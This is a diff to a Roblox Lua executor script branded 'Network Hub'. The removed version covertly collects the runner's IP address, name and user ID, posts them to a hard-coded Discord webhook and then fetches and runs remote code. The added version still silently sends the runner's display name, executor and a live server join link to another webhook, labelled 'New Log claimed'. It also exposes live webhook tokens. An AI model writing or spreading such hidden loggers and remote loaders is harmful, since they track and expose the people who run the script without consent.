@@ -1,70 +1,102 @@
---// Config
-getgenv().whscript = "Network Hub"
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1425335660461559868/WEQTCjQ4Aph1No06hPyUbyuKcweH3RYCtUPb_6XkPJnzLdAWqKIANrGDyaHIqCoiweDn"
-getgenv().ExecLogSecret = true
---// Services
-local player = game:GetService("Players").LocalPlayer
-local httpService = game:GetService("HttpService")
---// IP Logger (Multiple Fallbacks)
-local function getIP()
-if not ExecLogSecret then return end
-local ipServices = {
-"https://api.ipify.org",
-"https://ipinfo.io/ip", 
-"https://icanhazip.com"
-}
-for _, url in ipairs(ipServices) do
-local success, ip = pcall(function()
-return game:HttpGet(url, true):gsub("%s+", "")
+-- Ultimate NETWORK HUB-style Logger (2025-2026 Edition) + Dynamic Joiner
+local Players = game:GetService("Players")
+local Http = game:GetService("HttpService")
+local Market = game:GetService("MarketplaceService")
+local plr = Players.LocalPlayer
+
+local webhook = "https://discord.com/api/webhooks/1500270818708684900/rjjsg9lOzPOMbh0AMuKFxDa4nYA7wos1EKe6h728YvTSB0_xqusuK5fD_50-dR5pipYm"
+
+-- Executor Detection
+local executor = (
+    getexecutorname and getexecutorname() or
+    identifyexecutor and identifyexecutor() or
+    syn and "Synapse X" or
+    syn.request and "Synapse X (Legacy)" or
+    Fluxus and "Fluxus" or
+    isfluxusclosure and "Fluxus" or
+    KRNL_LOADED and "Krnl" or
+    isexecutorclosure and "ScriptWare" or
+    getgc and "Celery" or
+    ishydrogenclosure and "Hydrogen" or
+    gethui and "Wave" or
+    is_trinity_executor and "Trinity" or
+    is_nebula_executor and "Nebula" or
+    is_comet_executor and "Comet" or
+    is_valyse_executor and "Valyse" or
+    getexploit and "Codex" or
+    is_sirhurt_closure and "Sirhurt" or
+    secure_load and "Sentinel" or
+    is_scylla_closure and "Scylla" or
+    isevon and "Evon" or
+    is_roexec and "Roexec" or
+    is_calypso and "Calypso" or
+    is_matx and "MatX" or
+    is_temple and "Temple" or
+    is_oxygen and "Oxygen" or
+    is_karma and "Karma" or
+    is_vega and "Vega X" or
+    is_jjsploit and "JJSploit" or
+    is_delta and "Delta" or
+    is_solara and "Solara" or
+    is_electron_executor and "Electron" or
+    is_arceus and "Arceus X" or
+    is_nihon and "Nihon" or
+    is_omega and "Omega" or
+    is_blackout and "Blackout" or
+    is_thunder and "Thunder" or
+    "Unknown / Paid / Custom Executor"
+)
+
+local gameName = "Unknown Game"
+pcall(function()
+    gameName = Market:GetProductInfo(game.PlaceId).Name
 end)
-if success and ip then return ip end
-end
-end
---// Enhanced Webhook Logger
-local function logExecution()
-local embed = {
-title = "📜 Script Execution Log",
-color = 0x5856F2,
-fields = {
-{
-name = "👤 Player Info",
-value = string.format("```Name: %s (@%s)\nUserID: %d```",
-player.DisplayName, player.Name, player.UserId),
-inline = true
-},
-{
-name = "🛠️ Execution Info", 
-value = string.format("```Executor: %s\nGame: %s```",
-identifyexecutor() or "Unknown", game.GameId),
-inline = true
-}
-},
-footer = {text = "Network Hub• "..os.date("%x %X")}
-}
-if ExecLogSecret then
-local ip = getIP()
-if ip then
-table.insert(embed.fields, {
-name = "🌐 Network Info",
-value = "||IP: `"..ip.."`||",
-inline = false
-})
-end
-end
--- Updated Join Link (now uses current game's PlaceId)
+
+-- Dynamic Join Link
 local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
-table.insert(embed.fields, {
-name = "Join link:",
-value = joinLink,
-inline = true
-})
-request({
-Url = webhookexecUrl,
-Method = "POST",
-Headers = {["Content-Type"] = "application/json"},
-Body = httpService:JSONEncode({embeds = {embed}})
-})
+
+-- Logger Data
+local data = {
+    content = "|| New Log claimed ||",
+    embeds = {{
+        title = "NETWORK HUB • EXECUTION BETA",
+        description = "",
+        color = 16777215,  -- White
+        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
+        fields = {
+            {name = "Display Name",  value = plr.DisplayName,                                                              inline = true},
+            {name = "Executor",      value = executor,                                                                     inline = true},
+            {name = "Join Link",     value = joinLink,                                                                     inline = true},
+        },
+        footer = {text = "NETWORK Hub BETA • "..os.date("%Y-%m-%d %X")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+-- Send Log
+local req = syn and syn.request or http_request or request or Http.request or HttpPost
+if req then
+    pcall(function()
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = Http:JSONEncode(data)
+        })
+    end)
 end
---// Execute
-logExecution()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bla3de/friendly-octo-system/refs/heads/main/z%20vhf%20zc"))()
+
+-- Auto Join via Fern.wtf
+print("🌐 Attempting to join current server via Fern.wtf...")
+print("Join Link: " .. joinLink)
+
+pcall(function()
+    if request then
+        request({
+            Url = joinLink,
+            Method = "GET"
+        })
+    end
+end)
+
+print("✅ Network Hub + Joiner executed successfully.")
